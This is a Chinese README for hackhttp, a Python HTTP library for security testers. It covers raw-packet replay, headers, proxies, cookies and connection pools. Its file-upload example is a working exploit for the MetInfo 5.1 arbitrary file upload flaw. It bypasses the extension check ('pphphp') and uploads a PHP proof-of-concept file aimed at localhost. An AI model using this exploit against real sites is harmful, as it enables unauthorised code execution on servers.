```
 _                _    _     _   _
| |__   __ _  ___| | _| |__ | |_| |_ _ __
| '_ \ / _` |/ __| |/ / '_ \| __| __| '_ \
| | | | (_| | (__|   <| | | | |_| |_| |_) |
|_| |_|\__,_|\___|_|\_\_| |_|\__|\__| .__/
                                    |_|
```
[![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/)  [![License](https://img.shields.io/badge/license-GPLv2-red.svg)](https://raw.githubusercontent.com/bugscanteam/hackhttp/master/GPL-2.0)

简介
---

hackhttp 是四叶草安全旗下 BugscanTeam 打造的一款 Python 语言的 HTTP 第三方库。是分布式漏洞扫描框架 BugScan 中核心库之一。

hackhttp 致力于帮助安全测试人员快速编写代码，除众多基础功能外，hackhttp 支持直接发送 HTTP 原始报文，开发者可以直接将浏览器或者 Burp Suite 等抓包工具中截获的 HTTP 报文复制后，无需修改报文，可直接使用 hackhttp 进行重放。

hackhttp 使用连接池技术，在应对大量请求时自动对连接进行复用，节省建立连接时间与服务器资源，这种天生的特性，在编写爬虫时尤为显著，测试用例中提供了一个爬取乌云所有漏洞的爬虫。

安装
---

### 使用 pip 安装

```
$ pip install hackhttp
```

如果提示找不到源可以手动指定为官方源：

```
$ pip install -i https://pypi.python.org/pypi hackhttp
```

### 使用源码安装

1. 获取源代码

 你可以通过用 Git 来克隆代码仓库中的最新源代码

 ```
 $ git clone git@github.com:BugScanTeam/hackhttp.git
 ```

 或者你可以点击 [这里](https://github.com/BugScanTeam/hackhttp/archive/master.zip) 下载最新的源代码 zip 包,并解压

 ```
 $ wget https://github.com/BugScanTeam/hackhttp/archive/master.zip
 $ unzip master.zip
 ```

2. 手动安装

 ```
 $ cd hackhttp
 $ python setup.py install
 ```

使用
---

### 快速上手

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> url = "https://www.bugscan.net"
>>> code, head, html, redirect_url, log = hh.http(url)
```

### 返回值说明：

* **code**

	HTTP 状态码，类型为 int

* **head**

	HTTP 响应头，类型为 String

* **html**

	HTTP 响应体，类型为 String

* **redirect_url**

	遇到 HTTP 302 后的跳转地址，如果无跳转则为请求的地址，类型为 String

* **log**
    
    HTTP 日志信息，类型为 dict

    * url

        本次请求的第一个 URL 地址

    * request

        HTTP 请求报文

    * response

        HTTP 响应报文


### 详细说明

* [发送一个 GET 请求](#get)
* [发送表单 POST 请求](#post)
* [发送 HTTP 原始数据包](#raw)
* [自定义请求头](#headers)
* [代理功能使用](#proxy)
* [文件上传](#fileupload)
* [HTTP 连接池](#connectionpool)
* [自定义 Cookie](#cookie)
* [爬虫示例：抓取乌云所有漏洞](#wooyunspider)

#### 发送一个 GET 请求<div id="get"></div>

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> code, head, body, redirect, log = hh.http('https://www.bugscan.net')
>>> code
200
>>> '<html ng-app="Bugscan">' in body
True
```

#### 发送表单 POST 请求<div id="post"></div>

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> code, head, body, redirect, log = hh.http('http://httpbin.org/post', post="key1=val1&key2=val2")
>>> code
200
>>> print body
{
  ...
  "form": {
    "key1": "val1",
    "key2": "val2"
  },
  ...
}
```

#### 发送 HTTP 原始数据包<div id="raw"></div>

本例子中演示如何通过 raw 来发送表单 POST 数据，raw 中数据可以从 Burp Suite 中截取数据报文并直接复制。

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> raw='''POST /post HTTP/1.1
... Host: httpbin.org
... User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0
... Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
... Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
... Accept-Encoding: gzip, deflate
... Connection: close
... Content-Type: application/x-www-form-urlencoded
... Content-Length: 19
...
... key1=val1&key2=val2'''
>>> code, head, html, redirect, log = hh.http('http://httpbin.org/post', raw=raw)
>>> code
200
>>> print html
{
  ...
  "form": {
    "key1": "val1",
    "key2": "val2"
  },
  ...
}
```

#### 自定义请求头 <div id="headers"></div>

使用字典形式，需要使用将请求头字典传给 headers：

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> headers_dict = {
...     'X-Forwarder-For': 'https://q.bugscan.net',
...     'Hack-Http': 'Header Dict Val'
... }
>>> code, head, body, redirect, log = hh.http('https://www.bugscan.net', headers=headers_dict)
>>>
>>> print log['request']
GET / HTTP/1.1
Host: www.bugscan.net
X-Forwarder-For: https://q.bugscan.net
...
Hack-Http: Header Dict Val
>>>
```

使用字符串形式，需要将字符串传给 header:

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> 
>>> header_str='HH_HEADER_1: hh h1 val\r\nHH_HEADER_2:hh h2 val'
>>> 
>>> code, head, body, redirect, log = hh.http('https://www.bugscan.net', header=header_str)
>>>
>>> print log['request']
GET / HTTP/1.1
Host: www.bugscan.net
...
HH_HEADER_2: hh h2 val
HH_HEADER_1: hh h1 val
```

**注意：如果同时指定 header 和 headers，将只会使用 header 中的内容**

#### 代理功能使用<div id="proxy"></div>

目前代理仅支持 HTTP 代理

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp()
>>> proxy_str = ('127.0.0.1', 9119)
>>> code, head, body, redirect, log = hh.http('https://www.bugscan.net', proxy=proxy_str)
```

#### 文件上传<div id="fileupload"></div>

文件上传可以直接通过 Burp Suite 来抓包截取上传报文，使用 raw 方式上传。

MetInfo5.1 任意文件上传漏洞中，使用 hackhttp 上传文件：

```
#!/usr/bin/env python
# coding:utf-8
import hackhttp

target = "http://127.0.0.1/metinfo5.1/"
url = target + "feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo"

raw = '''POST /feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo HTTP/1.1
Host: localhost
Content-Length: 423
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE1toBNeESf6p0uXQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=hfqa37uap92gdaoc2nsco6g0n1

------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="fd_para[1][para]"

filea
------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="fd_para[1][type]"

5
------WebKitFormBoundaryE1toBNeESf6p0uXQ
Content-Disposition: form-data; name="filea"; filename="test.php"
Content-Type: application/x-php

<?php echo md5(1);unlink(__FILE__);?>
------WebKitFormBoundaryE1toBNeESf6p0uXQ--
    '''
hh = hackhttp.hackhttp()
code, head, body, redirect, log = hh.http(url, raw=raw)

```

#### HTTP 连接池<div id="connectionpool"></div>

创建拥有 500 个连接的连接池：

```
>>> import hackhttp
>>> hh = hackhttp.hackhttp(hackhttp.httpconpool(500))
```
hackhttp 会选择空闲状态的连接，发送 HTTP 报文，节省建立连接的时间，连接池中默认连接数为 10.

#### 自定义 Cookie <div id="cookie"></div>

在创建 hackhttp 对象时指定 `cookie_str` 参数：

```
>>> import hackhttp
>>> hh=hackhttp.hackhttp(cookie_str="a=b;")
>>> code, head, body, redirect, log = hh.http('https://www.bugscan.net')
>>> print log['request']
GET / HTTP/1.1
Host: www.bugscan.net
Content-Length: 0
Connection: Keep-Alive
Cookie: a=b
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
>>>
```
或者将 cookie 直接加入到 HTTP Header 中，具体参考 [自定义请求头](#headers)

**注意：如果在创建 hackhttp 实例时指定 `cookie_str`，那么在此实例销毁之前，通过该实例创建的 http 请求中都会携带该 cookie**

#### 爬虫示例：抓取乌云所有漏洞<div id="wooyunspider"></div>

测试用例 `test/` 目录下提供了一个爬虫，使用 hackhttp 爬取乌云所有公开漏洞：

[Wooyun Spider](test/wooyun_spider.py)

> 需要自行安装 `thread_pool` 第三方库

使用：

```
$ cd test/
$ python -i wooyun_spider.py
```

相关链接
---

* [版权声明](./GPL-2.0)
* [BugScan 社区官网](https://www.bugscan.net)